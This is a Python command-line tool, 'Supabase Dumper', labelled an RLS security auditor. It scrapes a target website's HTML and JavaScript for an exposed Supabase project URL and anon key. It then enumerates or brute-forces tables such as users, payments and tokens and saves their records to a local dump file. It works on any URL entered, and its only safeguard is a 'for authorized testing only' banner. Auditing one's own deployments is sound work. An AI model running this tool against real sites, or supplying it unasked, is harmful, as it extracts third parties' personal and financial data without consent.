import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import json
import datetime
import os
import sys
import time

# ═══════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════
REPORT_FILE = "supabase_full_dump.txt"

# ═══════════════════════════════════════════════════════════
#  ANSI COLORS
# ═══════════════════════════════════════════════════════════
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    BG_RED  = "\033[41m"
    BG_GREEN= "\033[42m"

# ═══════════════════════════════════════════════════════════
#  ASCII ART & GRAPHICS
# ═══════════════════════════════════════════════════════════
BANNER = f"""{C.RED}{C.BOLD}
    ███████╗██╗   ██╗██████╗  █████╗ ██████╗  █████╗ ███████╗███████╗
    ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
    ███████╗██║   ██║██████╔╝███████║██████╔╝███████║███████╗█████╗  
    ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██╗██╔══██║╚════██║██╔══╝  
    ███████║╚██████╔╝██║     ██║  ██║██████╔╝██║  ██║███████║███████╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
{C.CYAN}    ██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ██║  ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
    ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗
    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║
    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{C.RESET}
{C.GRAY}    ╔══════════════════════════════════════════════════════╗
    ║  {C.WHITE}Supabase RLS Security Auditor{C.GRAY}                       ║
    ║  {C.YELLOW}v2.0{C.GRAY} │ {C.RED}For authorized testing only{C.GRAY}                  ║
    ║  {C.DIM}github.com/nickquellovero{C.GRAY}                           ║
    ╚══════════════════════════════════════════════════════╝{C.RESET}
"""

SKULL = f"""{C.RED}
           ░░░░░░░░░░░░░░░░░░
         ░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░
       ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
      ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
     ░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░
     ░▒▒▒▒░░▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒░
      ░▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒░
       ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░
         ░░▒░▒░▒░▒░▒░▒░░░
            ░░░░░░░░░░░{C.RESET}
"""

# ═══════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════
def typing_effect(text, delay=0.015):
    """Hacker-style typing animation."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def hacker_line(char="═", length=60):
    return f"{C.GRAY}{'═' * length}{C.RESET}"

def status(icon, color, msg):
    """Print a formatted status line."""
    icons = {
        "info":    f"{C.CYAN}[▸]{C.RESET}",
        "ok":      f"{C.GREEN}[✓]{C.RESET}",
        "warn":    f"{C.YELLOW}[⚠]{C.RESET}",
        "fail":    f"{C.RED}[✗]{C.RESET}",
        "vuln":    f"{C.RED}{C.BOLD}[☠]{C.RESET}",
        "scan":    f"{C.MAGENTA}[◉]{C.RESET}",
        "data":    f"{C.CYAN}[⬡]{C.RESET}",
        "key":     f"{C.YELLOW}[⚿]{C.RESET}",
        "lock":    f"{C.GREEN}[🔒]{C.RESET}",
        "unlock":  f"{C.RED}[🔓]{C.RESET}",
    }
    prefix = icons.get(icon, f"[{icon}]")
    print(f"  {prefix} {msg}")

def progress_bar(current, total, label=""):
    """Hacker-style progress bar."""
    width = 30
    filled = int(width * current / total) if total > 0 else 0
    bar = f"{C.GREEN}{'█' * filled}{C.GRAY}{'░' * (width - filled)}{C.RESET}"
    pct = int(100 * current / total) if total > 0 else 0
    sys.stdout.write(f"\r  {C.CYAN}[◈]{C.RESET} {bar} {C.WHITE}{pct}%{C.RESET} {C.DIM}{label}{C.RESET}")
    sys.stdout.flush()
    if current == total:
        print()

def section_header(title):
    """Section header with box borders."""
    width = 56
    pad = width - len(title) - 2
    left = pad // 2
    right = pad - left
    print(f"\n  {C.CYAN}╔{'═' * width}╗{C.RESET}")
    print(f"  {C.CYAN}║{' ' * left} {C.WHITE}{C.BOLD}{title}{C.RESET} {C.CYAN}{' ' * right}║{C.RESET}")
    print(f"  {C.CYAN}╚{'═' * width}╝{C.RESET}")

def table_row(key, value, key_color=C.GRAY, val_color=C.WHITE):
    """Formatted table row."""
    print(f"  {C.GRAY}│{C.RESET} {key_color}{key:<20}{C.RESET} {C.GRAY}│{C.RESET} {val_color}{value}{C.RESET}")

def fake_loading(msg, steps=15, delay=0.05):
    """Fake loading spinner for aesthetic effect."""
    sys.stdout.write(f"  {C.CYAN}[◉]{C.RESET} {msg} ")
    for i in range(steps):
        chars = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
        sys.stdout.write(f"\r  {C.CYAN}[{chars[i % len(chars)]}]{C.RESET} {msg} ")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(f"\r  {C.GREEN}[✓]{C.RESET} {msg}   \n")

# ═══════════════════════════════════════════════════════════
#  FILE REPORT
# ═══════════════════════════════════════════════════════════
def save_to_file(content):
    """Write content to the report file."""
    try:
        # Strip ANSI codes for clean file output
        clean = re.sub(r'\033\[[0-9;]*m', '', content)
        with open(REPORT_FILE, "a", encoding="utf-8") as f:
            f.write(clean + "\n")
    except Exception as e:
        status("fail", C.RED, f"File write error: {e}")

# ═══════════════════════════════════════════════════════════
#  PHASE 1: CONFIG EXTRACTION
# ═══════════════════════════════════════════════════════════
def extract_config(url):
    section_header("PHASE 1 ─ RECON & CONFIG EXTRACTION")
    print()
    
    fake_loading("Initializing recon module...")
    fake_loading("Preparing spoofed headers...")
    status("scan", C.MAGENTA, f"Target: {C.WHITE}{C.BOLD}{url}{C.RESET}")
    print()

    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Supabase-Security-Audit)'}
        
        fake_loading("Downloading HTML source...")
        response = requests.get(url, headers=headers, timeout=10)
        content = response.text
        soup = BeautifulSoup(content, 'html.parser')

        status("info", C.CYAN, f"Response Code: {C.YELLOW}{response.status_code}{C.RESET}")
        status("info", C.CYAN, f"Content Length: {C.YELLOW}{len(content)} bytes{C.RESET}")
        print()

        # Search for project URL
        fake_loading("Scanning for Supabase Project URL...")
        url_pattern = r"https://([a-z0-9-]+)\.supabase\.co"
        project_match = re.search(url_pattern, content)

        # Search for Anon Key
        fake_loading("Scanning for exposed API Keys...")
        key_pattern = r"eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+"
        key_matches = re.findall(key_pattern, content)

        # If not found, search in external JS files
        if not project_match or not key_matches:
            scripts = soup.find_all('script', src=True)
            status("info", C.CYAN, f"External JS files found: {C.YELLOW}{len(scripts)}{C.RESET}")
            
            for i, script in enumerate(scripts):
                if project_match and key_matches:
                    break
                try:
                    js_url = urljoin(url, script['src'])
                    progress_bar(i + 1, len(scripts), f"Analyzing: {js_url[:50]}...")
                    js_resp = requests.get(js_url, headers=headers, timeout=5)
                    if not project_match:
                        project_match = re.search(url_pattern, js_resp.text)
                    if not key_matches:
                        found_keys = re.findall(key_pattern, js_resp.text)
                        if found_keys:
                            key_matches.extend(found_keys)
                except:
                    continue
            print()

        project_url = project_match.group(0) if project_match else None
        anon_key = key_matches[0] if key_matches else None

        # Results
        print()
        print(f"  {C.GRAY}┌──────────────────────────────────────────────┐{C.RESET}")
        print(f"  {C.GRAY}│{C.RESET} {C.BOLD}{C.WHITE}RECON RESULTS{C.RESET}                                 {C.GRAY}│{C.RESET}")
        print(f"  {C.GRAY}├──────────────────────────────────────────────┤{C.RESET}")
        
        if project_url:
            status("ok", C.GREEN, f"Project URL: {C.GREEN}{project_url}{C.RESET}")
        else:
            status("fail", C.RED, f"Project URL: {C.RED}Not found{C.RESET}")
        
        if anon_key:
            masked = anon_key[:15] + "..." + anon_key[-10:]
            status("key", C.YELLOW, f"Anon Key:    {C.YELLOW}{masked}{C.RESET}")
        else:
            status("fail", C.RED, f"Anon Key:    {C.RED}Not found{C.RESET}")
        
        print(f"  {C.GRAY}└──────────────────────────────────────────────┘{C.RESET}")

        return project_url, anon_key

    except Exception as e:
        status("fail", C.RED, f"Scraping error: {e}")
        return None, None

# ═══════════════════════════════════════════════════════════
#  PHASE 2: VULNERABILITY TESTING
# ═══════════════════════════════════════════════════════════
def test_vulnerability(target_site, project_url, anon_key):
    section_header("PHASE 2 ─ RLS VULNERABILITY SCAN")
    print()

    # Report header
    header_report = f"""
{'='*50}
 SUPABASE SECURITY AUDIT REPORT
 Date:        {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 Target:      {target_site}
 Project URL: {project_url}
{'='*50}
"""
    save_to_file(header_report)

    headers = {
        "apikey": anon_key,
        "Authorization": f"Bearer {anon_key}",
        "Content-Type": "application/json"
    }

    base_rest_url = f"{project_url}/rest/v1/"
    tables_to_check = []

    # ─── Table Discovery ───
    fake_loading("Connecting to REST endpoint...")
    fake_loading("Attempting OpenAPI schema read...")

    try:
        schema_resp = requests.get(base_rest_url, headers=headers, timeout=5)
        if schema_resp.status_code == 200:
            definitions = schema_resp.json().get('definitions', {})
            tables_to_check = list(definitions.keys())
            status("ok", C.GREEN, f"Schema found! Tables detected: {C.WHITE}{C.BOLD}{len(tables_to_check)}{C.RESET}")
            save_to_file(f"[+] Schema found! Tables detected: {len(tables_to_check)}")
            
            # Display discovered tables
            print()
            print(f"  {C.GRAY}┌─ Discovered Tables {'─' * 29}┐{C.RESET}")
            for i, t in enumerate(tables_to_check):
                icon = "├" if i < len(tables_to_check) - 1 else "└"
                print(f"  {C.GRAY}{icon}──{C.RESET} {C.CYAN}⬡{C.RESET} {C.WHITE}{t}{C.RESET}")
            print()
        else:
            status("warn", C.YELLOW, "Schema hidden. Starting common table brute-force...")
            save_to_file("[-] Schema hidden. Using common table list (brute-force).")
            tables_to_check = [
                'users', 'profiles', 'todos', 'posts', 'products',
                'orders', 'settings', 'admin', 'customers', 'messages',
                'comments', 'accounts', 'sessions', 'payments', 'items',
                'categories', 'logs', 'notifications', 'tokens', 'files'
            ]
    except Exception as e:
        status("fail", C.RED, f"Connection error: {e}")
        return

    # ─── Data Extraction ───
    section_header("PHASE 3 ─ DATA EXTRACTION")
    print()
    
    fake_loading("Initializing extraction module...")
    
    vulnerable_count = 0
    safe_count = 0
    total = len(tables_to_check)

    for i, table in enumerate(tables_to_check):
        progress_bar(i + 1, total, f"Testing: {table}")
        query_url = f"{base_rest_url}{table}?select=*&limit=5"

        try:
            r = requests.get(query_url, headers=headers, timeout=5)

            if r.status_code == 200:
                data = r.json()

                if isinstance(data, list) and len(data) > 0:
                    vulnerable_count += 1
                    formatted_json = json.dumps(data, indent=2, ensure_ascii=False)

                    # Screen output
                    print(f"\n  {C.RED}{C.BOLD}  ╔══════════════════════════════════════════╗{C.RESET}")
                    print(f"  {C.RED}{C.BOLD}  ║  ☠  VULNERABLE: {table:<25}║{C.RESET}")
                    print(f"  {C.RED}{C.BOLD}  ║  RLS: OFF │ Rows: {len(data):<22}║{C.RESET}")
                    print(f"  {C.RED}{C.BOLD}  ╚══════════════════════════════════════════╝{C.RESET}")
                    
                    # Data preview
                    print(f"  {C.DIM}  ┌─ Data Preview ──────────────────────────┐{C.RESET}")
                    preview_lines = formatted_json.split('\n')[:8]
                    for line in preview_lines:
                        # Highlight keys and values
                        colored = line
                        colored = re.sub(r'"([^"]+)":', f'{C.CYAN}"\\1"{C.RESET}:', colored)
                        print(f"  {C.DIM}  │{C.RESET} {colored}")
                    if len(formatted_json.split('\n')) > 8:
                        print(f"  {C.DIM}  │ {C.YELLOW}... [{len(formatted_json.split(chr(10)))} total lines]{C.RESET}")
                    print(f"  {C.DIM}  └──────────────────────────────────────────┘{C.RESET}")
                    print()

                    # File output
                    log_entry = f"\n[TABLE: {table}]\nStatus: VULNERABLE (RLS OFF)\nContent (First 5 records):\n{formatted_json}\n{'-'*40}"
                    save_to_file(log_entry)

                elif isinstance(data, list) and len(data) == 0:
                    safe_count += 1
            else:
                safe_count += 1

        except Exception as e:
            continue

    # ═══════════════════════════════════════════════════════════
    #  FINAL REPORT
    # ═══════════════════════════════════════════════════════════
    section_header("FINAL REPORT")
    print()
    
    print(f"  {C.GRAY}┌──────────────────────────────────────────────┐{C.RESET}")
    print(f"  {C.GRAY}│{C.RESET}  {C.BOLD}SCAN STATISTICS{C.RESET}                              {C.GRAY}│{C.RESET}")
    print(f"  {C.GRAY}├──────────────────────────────────────────────┤{C.RESET}")
    print(f"  {C.GRAY}│{C.RESET}  Tables tested:      {C.WHITE}{total}{C.RESET}")
    print(f"  {C.GRAY}│{C.RESET}  Vulnerable tables:  {C.RED}{vulnerable_count}{C.RESET}")
    print(f"  {C.GRAY}│{C.RESET}  Safe tables:        {C.GREEN}{safe_count}{C.RESET}")
    print(f"  {C.GRAY}│{C.RESET}  Tables not found:   {C.GRAY}{total - vulnerable_count - safe_count}{C.RESET}")
    print(f"  {C.GRAY}└──────────────────────────────────────────────┘{C.RESET}")
    print()

    if vulnerable_count > 0:
        print(SKULL)
        print(f"  {C.BG_RED}{C.WHITE}{C.BOLD}  ⚠  WARNING: {vulnerable_count} EXPOSED TABLES WITH READABLE DATA  {C.RESET}")
        print(f"  {C.YELLOW}  Full report saved to: {C.WHITE}{C.BOLD}{REPORT_FILE}{C.RESET}")
        print()
        
        # Recommendations
        print(f"  {C.CYAN}╔═══ RECOMMENDATIONS ═══════════════════════════╗{C.RESET}")
        print(f"  {C.CYAN}║{C.RESET} {C.WHITE}1.{C.RESET} Enable RLS on all exposed tables             {C.CYAN}║{C.RESET}")
        print(f"  {C.CYAN}║{C.RESET} {C.WHITE}2.{C.RESET} Define granular access policies               {C.CYAN}║{C.RESET}")
        print(f"  {C.CYAN}║{C.RESET} {C.WHITE}3.{C.RESET} Remove anon key from frontend code            {C.CYAN}║{C.RESET}")
        print(f"  {C.CYAN}║{C.RESET} {C.WHITE}4.{C.RESET} Use service_role only on the server side       {C.CYAN}║{C.RESET}")
        print(f"  {C.CYAN}╚═══════════════════════════════════════════════╝{C.RESET}")
    else:
        print(f"  {C.BG_GREEN}{C.WHITE}{C.BOLD}  ✓  RESULT: No data extracted. RLS is active or tables are empty.  {C.RESET}")

    footer = f"\nResult: {'VULNERABLE' if vulnerable_count > 0 else 'SECURE'} - {vulnerable_count} exposed tables out of {total} tested.\n{'='*50}"
    save_to_file(footer)

    print(f"\n  {C.DIM}{'─' * 56}{C.RESET}")
    print(f"  {C.DIM}Scan completed: {datetime.datetime.now().strftime('%H:%M:%S')}{C.RESET}")
    print()

# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(BANNER)
    
    # Clean up old report file
    if os.path.exists(REPORT_FILE):
        os.remove(REPORT_FILE)

    print(f"  {C.GRAY}{'─' * 56}{C.RESET}")
    print()
    
    target = input(f"  {C.CYAN}[▸]{C.RESET} {C.WHITE}Enter target URL{C.RESET} {C.GRAY}>{C.RESET} ")
    if not target.startswith("http"):
        target = "https://" + target

    print()
    typing_effect(f"  {C.DIM}[sys] Initializing scan on {target}...{C.RESET}", 0.01)
    print()

    proj_url, key = extract_config(target)

    if proj_url and key:
        print()
        status("key", C.YELLOW, f"Key extracted: {C.GREEN}{key[:15]}...{C.RESET}")
        print()
        
        confirm = input(f"  {C.YELLOW}[⚠]{C.RESET} Proceed with vulnerability test? {C.GRAY}(y/n){C.RESET} > ")
        if confirm.lower() in ['y', 's', '']:
            test_vulnerability(target, proj_url, key)
        else:
            status("info", C.CYAN, "Scan cancelled by user.")
    else:
        print()
        status("fail", C.RED, f"Supabase not automatically detected on {target}")
        print()
        
        c = input(f"  {C.YELLOW}[⚠]{C.RESET} Do you want to enter the data manually? {C.GRAY}(y/n){C.RESET} > ")
        if c.lower() in ['y', 's']:
            print()
            p = input(f"  {C.CYAN}[▸]{C.RESET} Project URL {C.GRAY}>{C.RESET} ")
            k = input(f"  {C.CYAN}[▸]{C.RESET} Anon Key    {C.GRAY}>{C.RESET} ")
            test_vulnerability(target, p, k)
        else:
            print()
            status("info", C.CYAN, "Session terminated.")
    
    print(f"""
  {C.GRAY}╔══════════════════════════════════════════════════════╗
  ║ {C.DIM}Supabase Dumper v2.0 │ Use responsibly │ Stay legal{C.GRAY}  ║
  ╚══════════════════════════════════════════════════════╝{C.RESET}
""")
